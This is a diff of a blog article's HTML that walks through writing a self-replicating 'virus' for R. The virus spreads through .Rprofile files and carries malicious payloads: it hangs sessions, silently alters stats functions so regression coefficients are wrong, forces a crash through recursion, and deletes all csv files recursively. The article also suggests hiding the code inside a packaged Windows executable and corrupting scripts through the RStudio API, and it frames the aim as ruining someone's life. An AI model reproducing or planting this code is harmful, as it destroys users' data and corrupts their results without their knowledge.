@@ -17,7 +17,8 @@ tags:
 <li>do bad things</li>
 </ul>
 <p>This is not very hard to accomplish with R, as I will demonstrate in this article.</p>
-<p>##Replicate##</p>
+<div id="replicate" class="section level2">
+<h2>Replicate</h2>
 <p>The <a href="https://gist.github.com/iqis/e4030f6af45d0d3ebae21f2816c1fc58"><em>virus</em></a> exploits R’s initilization script, <code>.Rprofile</code>. When R starts up, it is going to look for this file in the current working directory and the user’s home directory, then runs everything in it:</p>
 <pre class="r"><code>{
     function() {
@@ -39,7 +40,10 @@ Type &#39;q()&#39; to quit R.
 
 Wow, your R is Rancid!!!</code></pre>
 <p>Any project that started by the user is going to have its project folder infected. Likewise, if someone copy-and-pasted the R project folder to another computer, and start R from there, his home folder is going to be infected.</p>
-<p>##Damage##</p>
+<p>As R is an interpreted language, this seems to be the only way to infection. To conceal our malicous code, there is a way of packing a Shiny app into a Windows executable through using a tool called <a href="https://ficonsulting.github.io/RInno/">RInno</a>, which has <a href="https://electronjs.org/">Electron</a> behind itself.</p>
+</div>
+<div id="damage" class="section level2">
+<h2>Damage</h2>
 <p>It looks like that the replication part of the virus is taken care of. What, then, are some malicious scripts that we can have fun with?</p>
 <p>There could be countless ways.</p>
 <p>One of the easiest thing to do is to hang the user’s R session. It could be done as simply as putting it to <em>sleep</em> for a really long time:</p>
@@ -81,30 +85,32 @@ Wow, your R is Rancid!!!</code></pre>
        &quot;package:stats&quot;)</code></pre>
 <p>Now when we build a model; the coefficients looks normal, but are completely off. You can compare the this with the result on your own computer.</p>
 <pre class="r"><code>lm(mpg ~ ., data = mtcars)$coefficients</code></pre>
-<pre><code>##  (Intercept)          cyl         disp           hp         drat 
-##  8.244891069 -0.074679888  0.008936378 -0.014395866  0.527468656 
-##           wt         qsec           vs           am         gear 
-## -2.489745966  0.550206103  0.212943194  1.688885983  0.439213574 
-##         carb 
-## -0.133637327</code></pre>
+<pre><code>## (Intercept)         cyl        disp          hp        drat          wt 
+## 18.10085297 -0.16395240  0.01961894 -0.03160472  1.15800591 -5.46599407 
+##        qsec          vs          am        gear        carb 
+##  1.20792375  0.46749598  3.70778420  0.96425050 -0.29338770</code></pre>
 <p>In the above, we saved a copy of the original function in the base package. If we didn’t do that, we would have create an infinite recursion through self-refernce, such as:</p>
 <pre class="r"><code>reassign(&quot;paste&quot;,
          function(...) paste(...),
          &quot;package:base&quot;)</code></pre>
 <pre class="r"><code>paste(&quot;foo&quot;, &quot;bar&quot;)</code></pre>
-<p>Running this will crash the R session. If the user didn’t save documents before setting off this bomb, too bad.</p>
-<p>There are yet more ways to damages. For starters, how about deleting every <code>csv</code> file the user has in the working directory?</p>
+<p>Running this will crash the R session. If the user didn’t save documents before setting off this bomb,it’s obviously too bad.</p>
+</div>
+<div id="further-damage" class="section level2">
+<h2>Further Damage</h2>
+<p>There are yet more ways to our streak of mischief. For starters, how about deleting every <code>csv</code> file the user has in the working directory?</p>
 <pre class="r"><code>file.remove(list.files(getwd(), 
                        &quot;.csv&quot;,
                        recursive = TRUE)</code></pre>
-<p>Doing something on the file system can mean a lot.</p>
+<p>Doing something on the file system is a big step foward form just messing with their R session.</p>
 <p>From annoying to destructive, the level of naughtiness only limited by on your imagination. With some deliberation, you can ruin someone’s life in a very meaningful way.</p>
 <p>Here are some futher ideas:</p>
 <ul>
 <li>Bloat the user’s disk space with meaningless data</li>
 <li>Give wrong results only <em>sometimes</em> when a function is called</li>
-<li>Use Rstudio API to mess with the user’s scripts</li>
+<li>Use <a href="https://rstudio.github.io/rstudio-extensions/pkgdown/rstudioapi/index.html">Rstudio API</a> to mess with the user’s scripts in the editor, or some other wild sh*t.</li>
 </ul>
 <p><strong>Note</strong><br />
 You also have the choice of putting any of the malicious programs in <code>.First()</code> and <code>.Last()</code> functions, which will run at the beginning and the end of a session. See the <a href="https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html">R Manual</a> for details.</p>
 <p>More on <code>.Rprofile</code>: <a href="http://www.onthelambda.com/2014/09/17/fun-with-rprofile-and-customizing-r-startup/">Fun with .Rprofile and customizing R startup</a></p>
+</div>
